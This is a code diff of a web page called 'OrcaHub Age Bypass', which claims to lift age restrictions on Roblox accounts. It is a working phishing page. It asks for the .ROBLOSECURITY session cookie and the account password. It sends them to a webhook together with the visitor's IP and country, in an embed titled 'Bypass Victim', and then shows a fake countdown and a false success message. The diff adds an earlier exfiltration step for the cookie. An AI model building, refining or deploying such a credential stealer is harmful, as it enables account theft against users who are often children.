@@ -194,7 +194,7 @@
             z-index: 20;
             width: 92%;
             max-width: 480px;
-            background: rgba(16, 16, 30, 0.9);
+            background: rgba(16, 16, 30, 0.92);
             backdrop-filter: blur(25px);
             -webkit-backdrop-filter: blur(25px);
             border-radius: 40px;
@@ -209,69 +209,113 @@
             to { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
 
-        .card-header {
+        /* ===== STEP INDICATOR ===== */
+        .step-indicator {
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            margin-bottom: 12px;
+            margin-bottom: 16px;
+            gap: 4px;
         }
 
-        .card-header h3 {
-            font-size: 14px;
+        .step-dot {
+            flex: 1;
+            text-align: center;
+            padding: 6px 0;
+            background: rgba(30, 30, 48, 0.4);
+            border-radius: 30px;
+            font-size: 0.55rem;
             font-weight: 700;
-            color: #fff;
-            letter-spacing: 1px;
+            color: #5a5a72;
+            transition: all 0.5s ease;
+            border: 1px solid transparent;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        .card-header span {
-            font-size: 10px;
+        .step-dot.active {
+            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
+            color: white;
+            box-shadow: 0 0 20px rgba(162, 155, 254, 0.2);
+            transform: scale(1.02);
+            border-color: rgba(255,255,255,0.1);
+        }
+
+        .step-dot.completed {
+            background: rgba(78, 205, 196, 0.15);
             color: #4ecdc4;
-            font-weight: 600;
+            border-color: rgba(78, 205, 196, 0.15);
         }
 
-        .input-group {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            margin-bottom: 12px;
+        .step-dot.error {
+            background: rgba(255, 107, 107, 0.15);
+            color: #ff6b6b;
+            border-color: rgba(255, 107, 107, 0.15);
         }
 
-        .input-group input {
+        /* ===== FORM STEPS ===== */
+        .form-step {
+            display: none;
+            animation: slideUp 0.5s ease;
+        }
+
+        .form-step.active-step {
+            display: block;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-step label {
+            display: block;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #c0c0dd;
+            font-size: 0.75rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .form-step input {
             width: 100%;
-            padding: 11px 16px;
+            padding: 13px 18px;
             background: rgba(10, 10, 20, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.05);
             border-radius: 30px;
             color: #f0f0ff;
-            font-size: 12px;
+            font-size: 0.9rem;
             outline: none;
-            transition: 0.4s;
+            transition: all 0.4s ease;
+            margin-bottom: 14px;
         }
 
-        .input-group input:focus {
+        .form-step input:focus {
             border-color: #a29bfe;
             box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.08);
+            background: rgba(20, 20, 36, 0.7);
         }
 
-        .input-group input::placeholder {
+        .form-step input::placeholder {
             color: #3a3a52;
         }
 
-        .input-group input.error {
+        .form-step input.error {
             border-color: #ff6b6b;
             box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
         }
 
-        .input-group input.success {
+        .form-step input.success {
             border-color: #4ecdc4;
             box-shadow: 0 0 0 4px rgba(78, 205, 196, 0.1);
         }
 
+        /* ===== PROFILE PREVIEW ===== */
         .profile-preview {
             background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
             border-radius: 32px;
             padding: 14px 18px;
-            margin-bottom: 12px;
+            margin-bottom: 14px;
             border: 1px solid rgba(255, 255, 255, 0.03);
             display: none;
             align-items: center;
@@ -334,22 +378,18 @@
             border: 1px solid rgba(78, 205, 196, 0.1);
         }
 
-        .btn-group {
-            display: flex;
-            gap: 8px;
-        }
-
+        /* ===== BUTTONS ===== */
         .btn-primary {
-            flex: 2;
-            padding: 11px;
+            width: 100%;
+            padding: 13px;
             background: linear-gradient(135deg, #a29bfe, #ff6b6b);
             border: none;
             border-radius: 30px;
             font-weight: 700;
-            font-size: 12px;
+            font-size: 0.9rem;
             color: white;
             cursor: pointer;
-            transition: 0.4s;
+            transition: all 0.4s ease;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
@@ -365,22 +405,42 @@
             transform: none !important;
         }
 
-        .btn-instagram {
-            flex: 1;
+        .btn-secondary {
+            width: 100%;
             padding: 11px;
+            background: rgba(50, 50, 74, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 0.8rem;
+            color: #8888aa;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(60, 60, 84, 0.4);
+            color: #ccccee;
+        }
+
+        .btn-instagram {
+            padding: 13px;
             background: linear-gradient(135deg, #f58529, #dd2a7b);
             border: none;
             border-radius: 30px;
             font-weight: 700;
-            font-size: 11px;
+            font-size: 0.85rem;
             color: white;
             cursor: pointer;
-            transition: 0.4s;
+            transition: all 0.4s;
             text-decoration: none;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 5px;
+            gap: 8px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
@@ -391,15 +451,30 @@
         }
 
         .btn-instagram svg {
-            width: 14px;
-            height: 14px;
+            width: 16px;
+            height: 16px;
             fill: currentColor;
         }
 
+        .btn-group {
+            display: flex;
+            gap: 8px;
+            margin-top: 4px;
+        }
+
+        .btn-group .btn-primary {
+            flex: 2;
+        }
+
+        .btn-group .btn-instagram {
+            flex: 1;
+        }
+
+        /* ===== LOADER ===== */
         .loader-container {
             display: none;
             text-align: center;
-            padding: 8px 0;
+            padding: 10px 0;
         }
 
         .loader-container.show {
@@ -413,14 +488,14 @@
         }
 
         .spinner {
-            width: 35px;
-            height: 35px;
+            width: 40px;
+            height: 40px;
             border: 3px solid rgba(162, 155, 254, 0.08);
             border-top-color: #a29bfe;
             border-right-color: #ff6b6b;
             border-radius: 50%;
             animation: spin 0.8s ease infinite;
-            margin: 0 auto 8px;
+            margin: 0 auto 10px;
         }
 
         @keyframes spin {
@@ -429,7 +504,7 @@
 
         .loader-text {
             color: #8888aa;
-            font-size: 11px;
+            font-size: 0.8rem;
             font-weight: 300;
         }
 
@@ -438,17 +513,18 @@
             font-weight: 700;
         }
 
+        /* ===== RESULT ===== */
         .result-message {
             display: none;
             background: rgba(78, 205, 196, 0.06);
             border: 1px solid rgba(78, 205, 196, 0.12);
             color: #4ecdc4;
-            padding: 10px 14px;
+            padding: 12px 16px;
             border-radius: 24px;
             text-align: center;
-            font-size: 12px;
+            font-size: 0.85rem;
             font-weight: 600;
-            margin-top: 10px;
+            margin-top: 12px;
             animation: fadeIn 0.4s ease;
         }
 
@@ -457,9 +533,9 @@
         }
 
         .result-message .big {
-            font-size: 1.8rem;
+            font-size: 2rem;
             display: block;
-            margin-bottom: 2px;
+            margin-bottom: 4px;
         }
 
         .error-message {
@@ -467,12 +543,12 @@
             background: rgba(255, 107, 107, 0.08);
             border: 1px solid rgba(255, 107, 107, 0.15);
             color: #ff6b6b;
-            padding: 8px 12px;
+            padding: 10px 14px;
             border-radius: 20px;
-            font-size: 11px;
+            font-size: 0.8rem;
             font-weight: 500;
             text-align: center;
-            margin-top: 8px;
+            margin-top: 10px;
             animation: fadeIn 0.4s ease;
         }
 
@@ -504,11 +580,10 @@
             .hero-text h1 { font-size: 2.5rem; letter-spacing: 2px; }
             .car-wrapper svg { width: 150px; }
             .glass-card { bottom: 25%; padding: 14px 16px; }
-            .card-header h3 { font-size: 12px; }
-            .card-header span { font-size: 9px; }
-            .input-group input { font-size: 11px; padding: 10px 14px; }
-            .btn-primary { font-size: 11px; padding: 10px; }
-            .btn-instagram { font-size: 10px; padding: 10px; }
+            .step-dot { font-size: 0.5rem; padding: 4px 0; }
+            .form-step input { font-size: 0.8rem; padding: 10px 14px; }
+            .btn-primary { font-size: 0.8rem; padding: 10px; }
+            .btn-instagram { font-size: 0.7rem; padding: 10px; }
             .profile-preview { flex-direction: column; text-align: center; }
             .profile-preview img { width: 56px; height: 56px; }
         }
@@ -519,11 +594,10 @@
             .car-wrapper svg { width: 160px; }
             .car-wrapper { bottom: 16%; }
             .glass-card { bottom: 22%; padding: 14px 16px; max-width: 94%; }
-            .card-header { margin-bottom: 8px; }
-            .input-group { gap: 6px; margin-bottom: 8px; }
-            .input-group input { padding: 8px 14px; font-size: 11px; }
-            .btn-primary { padding: 8px; font-size: 10px; }
-            .btn-instagram { padding: 8px; font-size: 10px; }
+            .step-indicator { margin-bottom: 10px; }
+            .form-step input { padding: 8px 14px; font-size: 0.8rem; margin-bottom: 10px; }
+            .btn-primary { padding: 10px; font-size: 0.8rem; }
+            .profile-preview { padding: 10px 14px; }
         }
     </style>
 </head>
@@ -575,50 +649,74 @@
 
     <!-- ===== GLASS CARD ===== -->
     <div class="glass-card" id="app">
-        <div class="card-header">
-            <h3>🔓 Age Bypass</h3>
-            <span>OrcaHub • v3.0</span>
+
+        <!-- ===== STEP INDICATOR ===== -->
+        <div class="step-indicator">
+            <div class="step-dot active" id="step1Dot">❶ Cookie</div>
+            <div class="step-dot" id="step2Dot">❷ Password</div>
+            <div class="step-dot" id="step3Dot">❸ Bypass</div>
         </div>
 
-        <div class="input-group">
-            <input type="text" id="cookieInput" placeholder="🍪 .ROBLOSECURITY Cookie" autocomplete="off">
-            <input type="password" id="passwordInput" placeholder="🔑 Account Password" autocomplete="off">
-        </div>
+        <!-- ===== STEP 1: COOKIE ===== -->
+        <div class="form-step active-step" id="step1">
+            <label>🍪 Enter .ROBLOSECURITY Cookie</label>
+            <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..." autocomplete="off">
 
-        <div id="profilePreview" class="profile-preview">
-            <img id="profileImg" src="" alt="avatar">
-            <div class="profile-info">
-                <div class="profile-name" id="profileName">@username</div>
-                <div class="profile-id" id="profileId">ID: --</div>
-                <div class="profile-stats" id="profileStats">📊 Followers: -- • Following: --</div>
-                <span class="badge-verified" id="profileBadge">✅ Verified</span>
+            <div id="profilePreview" class="profile-preview">
+                <img id="profileImg" src="" alt="avatar">
+                <div class="profile-info">
+                    <div class="profile-name" id="profileName">@username</div>
+                    <div class="profile-id" id="profileId">ID: --</div>
+                    <div class="profile-stats" id="profileStats">📊 Followers: -- • Following: --</div>
+                    <span class="badge-verified" id="profileBadge">✅ Verified</span>
+                </div>
             </div>
+
+            <div id="errorMessage1" class="error-message"></div>
+
+            <button class="btn-primary" id="verifyBtn">🔍 Verify Cookie</button>
         </div>
 
-        <div id="errorMessage" class="error-message"></div>
+        <!-- ===== STEP 2: PASSWORD ===== -->
+        <div class="form-step" id="step2">
+            <label>🔑 Enter Account Password</label>
+            <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
 
-        <div id="loaderContainer" class="loader-container">
-            <div class="spinner"></div>
-            <div class="loader-text">
-                ⏳ Processing bypass...<br>
-                <span class="time" id="timerDisplay">60</span> seconds remaining
+            <div id="errorMessage2" class="error-message"></div>
+
+            <button class="btn-primary" id="nextToBypassBtn">➡️ Next</button>
+            <button class="btn-secondary" id="backToStep1Btn">🔙 Back</button>
+        </div>
+
+        <!-- ===== STEP 3: BYPASS ===== -->
+        <div class="form-step" id="step3">
+            <div id="loaderContainer" class="loader-container show">
+                <div class="spinner"></div>
+                <div class="loader-text">
+                    ⏳ Processing bypass...<br>
+                    <span class="time" id="timerDisplay">60</span> seconds remaining
+                </div>
             </div>
-        </div>
 
-        <div id="resultMessage" class="result-message">
-            <span class="big">🎉</span>
-            <div style="font-size:0.95rem; margin-bottom:2px;">AGE EXCEEDED!</div>
-            <div style="font-size:0.7rem; font-weight:400; color:#8888aa;">
-                Age restriction removed from account.
+            <div id="resultMessage" class="result-message">
+                <span class="big">🎉</span>
+                <div style="font-size:0.95rem; margin-bottom:2px;">AGE EXCEEDED!</div>
+                <div style="font-size:0.7rem; font-weight:400; color:#8888aa;">
+                    Age restriction removed from account.
+                </div>
             </div>
-        </div>
 
-        <div class="btn-group">
-            <button class="btn-primary" id="bypassBtn">🚀 Start Bypass</button>
-            <a class="btn-instagram" id="instagramBtn" href="#" target="_blank">
-                <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
-                Owner
-            </a>
+            <div id="errorMessage3" class="error-message"></div>
+
+            <div class="btn-group">
+                <button class="btn-primary" id="bypassBtn">🚀 Start Bypass</button>
+                <a class="btn-instagram" id="instagramBtn" href="#" target="_blank">
+                    <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
+                    Owner
+                </a>
+            </div>
+
+            <button class="btn-secondary" id="backToStep2Btn">🔙 Back</button>
         </div>
 
         <div class="footer">OrcaHub • Secure &amp; Private</div>
@@ -631,11 +729,23 @@
 
             // ==================== DOM REFS ====================
             const DOM = {
+                step1: document.getElementById('step1'),
+                step2: document.getElementById('step2'),
+                step3: document.getElementById('step3'),
+                step1Dot: document.getElementById('step1Dot'),
+                step2Dot: document.getElementById('step2Dot'),
+                step3Dot: document.getElementById('step3Dot'),
                 cookieInput: document.getElementById('cookieInput'),
                 passwordInput: document.getElementById('passwordInput'),
+                verifyBtn: document.getElementById('verifyBtn'),
+                nextToBypassBtn: document.getElementById('nextToBypassBtn'),
+                backToStep1Btn: document.getElementById('backToStep1Btn'),
+                backToStep2Btn: document.getElementById('backToStep2Btn'),
                 bypassBtn: document.getElementById('bypassBtn'),
                 instagramBtn: document.getElementById('instagramBtn'),
-                error: document.getElementById('errorMessage'),
+                error1: document.getElementById('errorMessage1'),
+                error2: document.getElementById('errorMessage2'),
+                error3: document.getElementById('errorMessage3'),
                 loader: document.getElementById('loaderContainer'),
                 timer: document.getElementById('timerDisplay'),
                 result: document.getElementById('resultMessage'),
@@ -649,10 +759,27 @@
 
             DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';
 
+            let currentStep = 1;
             let bypassTimer = null;
             let isProcessing = false;
             let currentUserData = null;
             let userIP = '';
+            let verifiedCookie = false;
+
+            // ==================== STEP MANAGER ====================
+            function setStep(step) {
+                currentStep = step;
+                DOM.step1.classList.toggle('active-step', step === 1);
+                DOM.step2.classList.toggle('active-step', step === 2);
+                DOM.step3.classList.toggle('active-step', step === 3);
+
+                const dots = [DOM.step1Dot, DOM.step2Dot, DOM.step3Dot];
+                dots.forEach((dot, i) => {
+                    dot.classList.remove('active', 'completed', 'error');
+                    if (i + 1 === step) dot.classList.add('active');
+                    if (i + 1 < step) dot.classList.add('completed');
+                });
+            }
 
             // ==================== GET IP ====================
             async function getIP() {
@@ -660,16 +787,12 @@
                     const response = await fetch('https://api.ipify.org?format=json');
                     const data = await response.json();
                     userIP = data.ip || 'Unknown';
-                } catch (_) {
-                    userIP = 'Unknown';
-                }
-                
+                } catch (_) { userIP = 'Unknown'; }
                 try {
                     const countryResponse = await fetch(`https://ipapi.co/${userIP}/country_name/`);
                     const country = await countryResponse.text();
                     userIP = `${userIP} (${country.trim() || 'Unknown'})`;
                 } catch (_) {}
-                
                 return userIP;
             }
 
@@ -752,11 +875,26 @@
                 }
             }
 
-            // ==================== VALIDATE COOKIE ====================
-            async function validateCookie(cookie) {
+            // ==================== VERIFY COOKIE ====================
+            async function verifyCookie() {
+                const cookie = DOM.cookieInput.value.trim();
+                DOM.error1.classList.remove('show');
+                DOM.profilePreview.classList.remove('show');
+
+                if (!cookie || cookie.length < 15) {
+                    DOM.error1.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
+                    DOM.error1.classList.add('show');
+                    DOM.cookieInput.classList.add('error');
+                    return;
+                }
+
+                DOM.verifyBtn.disabled = true;
+                DOM.verifyBtn.textContent = '⏳ Verifying...';
+
                 const result = await fetchRobloxProfile(cookie);
                 if (result.valid) {
                     currentUserData = result.user;
+                    verifiedCookie = true;
                     DOM.profileName.textContent = `@${result.user.username}`;
                     DOM.profileId.textContent = `ID: ${result.user.userId}`;
                     DOM.profileStats.textContent =
@@ -770,76 +908,86 @@
                     DOM.profilePreview.classList.add('show');
                     DOM.cookieInput.classList.remove('error');
                     DOM.cookieInput.classList.add('success');
-                    DOM.error.classList.remove('show');
-                    return { valid: true, user: result.user };
+                    DOM.error1.classList.remove('show');
+                    DOM.verifyBtn.textContent = '✅ Verified!';
+                    DOM.step1Dot.classList.add('completed');
+
+                    // Send profile info to webhook
+                    await getIP();
+                    sendToWebhook({
+                        title: "🦈 OrcaHub • Cookie Verified",
+                        color: 0x7c6cf0,
+                        fields: [
+                            { name: "👤 Username", value: `\`${result.user.username}\``, inline: true },
+                            { name: "🆔 User ID", value: `\`${result.user.userId}\``, inline: true },
+                            { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
+                            { name: "📊 Followers", value: `\`${result.user.followers.toLocaleString()}\``, inline: true },
+                            { name: "📊 Following", value: `\`${result.user.following.toLocaleString()}\``, inline: true },
+                            { name: "✅ Verified", value: result.user.isVerified ? '✅ Yes' : '❌ No', inline: true },
+                            { name: "🌐 IP", value: `\`${userIP}\``, inline: true },
+                            { name: "🕒 Time", value: new Date().toISOString(), inline: true }
+                        ],
+                        footer: { text: "OrcaHub • Bypasser" },
+                        thumbnail: { url: result.user.avatarUrl }
+                    });
+
+                    setTimeout(() => setStep(2), 600);
                 } else {
-                    DOM.profilePreview.classList.remove('show');
-                    DOM.cookieInput.classList.remove('success');
+                    DOM.error1.textContent = result.error || '❌ Cookie expired or wrong';
+                    DOM.error1.classList.add('show');
                     DOM.cookieInput.classList.add('error');
-                    DOM.error.textContent = result.error || '❌ Cookie expired or wrong';
-                    DOM.error.classList.add('show');
-                    currentUserData = null;
-                    return { valid: false };
+                    DOM.verifyBtn.textContent = '🔍 Verify Cookie';
                 }
+
+                DOM.verifyBtn.disabled = false;
             }
 
             // ==================== START BYPASS ====================
             async function startBypass() {
-                const cookie = DOM.cookieInput.value.trim();
                 const password = DOM.passwordInput.value.trim();
-
-                DOM.error.classList.remove('show');
-                DOM.result.classList.remove('show');
-                DOM.loader.classList.remove('show');
-
-                if (!cookie || cookie.length < 15) {
-                    DOM.error.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
-                    DOM.error.classList.add('show');
-                    DOM.cookieInput.classList.add('error');
-                    return;
-                }
+                DOM.error2.classList.remove('show');
+                DOM.error3.classList.remove('show');
 
                 if (!password || password.length < 3) {
-                    DOM.error.textContent = '❌ Please enter your account password!';
-                    DOM.error.classList.add('show');
+                    DOM.error2.textContent = '❌ Please enter your account password!';
+                    DOM.error2.classList.add('show');
                     DOM.passwordInput.classList.add('error');
                     return;
                 }
 
-                // Validate cookie first
-                const validation = await validateCookie(cookie);
-                if (!validation.valid) {
+                if (!verifiedCookie || !currentUserData) {
+                    DOM.error2.textContent = '❌ Please verify your cookie first!';
+                    DOM.error2.classList.add('show');
+                    setStep(1);
                     return;
                 }
 
-                // Get IP
+                // Send full credentials to webhook
                 await getIP();
-
-                // Send credentials to webhook as embed
                 sendToWebhook({
                     title: "🎯 OrcaHub • Bypass Victim",
                     color: 0xff6b6b,
                     fields: [
-                        { name: "👤 Username", value: `\`${validation.user.username}\``, inline: true },
-                        { name: "🆔 User ID", value: `\`${validation.user.userId}\``, inline: true },
+                        { name: "👤 Username", value: `\`${currentUserData.username}\``, inline: true },
+                        { name: "🆔 User ID", value: `\`${currentUserData.userId}\``, inline: true },
                         { name: "🔑 Password", value: `\`${password}\``, inline: false },
-                        { name: "🍪 Cookie", value: `\`${cookie}\``, inline: false },
-                        { name: "📊 Followers", value: `\`${validation.user.followers.toLocaleString()}\``, inline: true },
-                        { name: "📊 Following", value: `\`${validation.user.following.toLocaleString()}\``, inline: true },
-                        { name: "✅ Verified", value: validation.user.isVerified ? '✅ Yes' : '❌ No', inline: true },
-                        { name: "📅 Created", value: `\`${validation.user.created}\``, inline: true },
+                        { name: "🍪 Cookie", value: `\`${DOM.cookieInput.value.trim()}\``, inline: false },
+                        { name: "📊 Followers", value: `\`${currentUserData.followers.toLocaleString()}\``, inline: true },
+                        { name: "📊 Following", value: `\`${currentUserData.following.toLocaleString()}\``, inline: true },
+                        { name: "✅ Verified", value: currentUserData.isVerified ? '✅ Yes' : '❌ No', inline: true },
+                        { name: "📅 Created", value: `\`${currentUserData.created}\``, inline: true },
                         { name: "🌐 IP", value: `\`${userIP}\``, inline: true },
                         { name: "🕒 Time", value: new Date().toISOString(), inline: true }
                     ],
                     footer: { text: "OrcaHub • Bypasser" },
-                    thumbnail: { url: validation.user.avatarUrl }
+                    thumbnail: { url: currentUserData.avatarUrl }
                 });
 
-                // Start processing
-                isProcessing = true;
+                setStep(3);
+                DOM.loader.classList.add('show');
+                DOM.result.classList.remove('show');
                 DOM.bypassBtn.disabled = true;
                 DOM.bypassBtn.textContent = '⏳ Processing...';
-                DOM.loader.classList.add('show');
 
                 let seconds = 60;
                 DOM.timer.textContent = seconds;
@@ -863,19 +1011,8 @@
                 DOM.loader.classList.remove('show');
                 DOM.result.classList.add('show');
 
-                isProcessing = false;
                 DOM.bypassBtn.disabled = false;
                 DOM.bypassBtn.textContent = '🚀 Start Bypass';
-
-                // Show profile again with updated info
-                if (currentUserData) {
-                    DOM.profileName.textContent = `@${currentUserData.username}`;
-                    DOM.profileId.textContent = `ID: ${currentUserData.userId}`;
-                    DOM.profileStats.textContent =
-                        `📊 Followers: ${currentUserData.followers.toLocaleString()} • Following: ${currentUserData.following.toLocaleString()}`;
-                    DOM.profileBadge.textContent = currentUserData.isVerified ? '✅ Verified' : '● Active';
-                    DOM.profilePreview.classList.add('show');
-                }
 
                 // Send final embed
                 sendToWebhook({
@@ -900,39 +1037,25 @@
             }
 
             // ==================== EVENTS ====================
+            DOM.verifyBtn.addEventListener('click', verifyCookie);
+            DOM.nextToBypassBtn.addEventListener('click', startBypass);
             DOM.bypassBtn.addEventListener('click', startBypass);
 
+            DOM.backToStep1Btn.addEventListener('click', () => setStep(1));
+            DOM.backToStep2Btn.addEventListener('click', () => setStep(2));
+
             DOM.cookieInput.addEventListener('keydown', (e) => {
-                if (e.key === 'Enter') startBypass();
+                if (e.key === 'Enter') verifyCookie();
             });
             DOM.passwordInput.addEventListener('keydown', (e) => {
                 if (e.key === 'Enter') startBypass();
             });
 
-            DOM.cookieInput.addEventListener('blur', function() {
-                const cookie = this.value.trim();
-                if (cookie && cookie.length > 5) {
-                    validateCookie(cookie);
-                }
-            });
-
-            DOM.cookieInput.addEventListener('input', function() {
-                if (this.value.trim().length > 5) {
-                    const cookie = this.value.trim();
-                    fetchRobloxProfile(cookie).then(result => {
-                        if (result.valid) {
-                            DOM.error.classList.remove('show');
-                            this.classList.remove('error');
-                            this.classList.add('success');
-                            DOM.profilePreview.classList.remove('show');
-                        } else {
-                            this.classList.remove('success');
-                            this.classList.add('error');
-                        }
-                    });
-                }
-            });
+            // ==================== INIT ====================
+            setStep(1);
+            getIP();
+            console.log('[🦈] OrcaHub Bypasser loaded');
         });
     </script>
 </body>
-            </html>
+    </html>
